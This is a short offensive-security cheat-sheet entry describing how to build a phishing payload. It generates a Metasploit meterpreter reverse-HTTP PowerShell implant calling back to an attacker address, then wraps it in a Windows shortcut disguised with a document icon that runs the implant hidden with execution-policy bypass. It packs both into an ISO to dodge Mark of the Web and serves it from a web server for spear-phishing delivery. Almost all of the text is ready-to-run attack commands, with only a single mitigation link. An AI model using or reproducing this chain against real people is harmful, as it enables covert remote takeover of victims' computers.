# Powershell Loader via Shortcut LNK

Search Tag(s): #initial-access #defense-evasion #windows #scenarios

```
$ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=80 -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | basenc -d --base64 > implant.ps1
```

Transfer the generated powershell reverse shell to the windows box to create `.lnk` shortcut and pack them into an ISO file

```powershell
PS C:\> $shortcutPath = "[<drive_letter>:]\path\to\directory\file.lnk"  
$WshShell = New-Object -ComObject WScript.Shell  
$Shortcut = $WshShell.CreateShortcut($shortcutPath)  
$Shortcut.TargetPath = 'conhost.exe'  
$Shortcut.Arguments = "--headless powershell.exe -noni -nop -ep bypass -file implant.ps1"  
$Shortcut.Description = "A shortcut backdoor"  
$Shortcut.IconLocation = 'C:\path\to\document.docx'  
$Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload  
$Shortcut.WindowStyle = 7  
$Shortcut.WorkingDirectory = "C:\Users\" + Eenv:USERNAME + "\Public"  
$Shortcut.Save()
```

Pack the files in a container.

```
$ packmypayload [--vhd-filesystem <fat | fat32 | ntfs>] --hide [<drive_letter>:]\path\to\directory\implant.ps1 --out-format iso C:\path\to\directory\ ISO_File.iso
```

Then copy the ISO File to your attacker machine and start a web server to simulate the spear phishing attack then finally you'll see **MOTW (Mark of the Web)** has not contaminated the `.lnk` shortcut file.

```
$ sudo python -m http.server 80
```

---
## References

- [Bumblebee Returns with New Infection Technique](https://blog.cyble.com/2022/09/07/bumblebee-returns-with-new-infection-technique/)

### Mitigation

- [Malicious.link: Blocking ISO mounting](https://room362.com/posts/2022/blocking-iso-mounting/)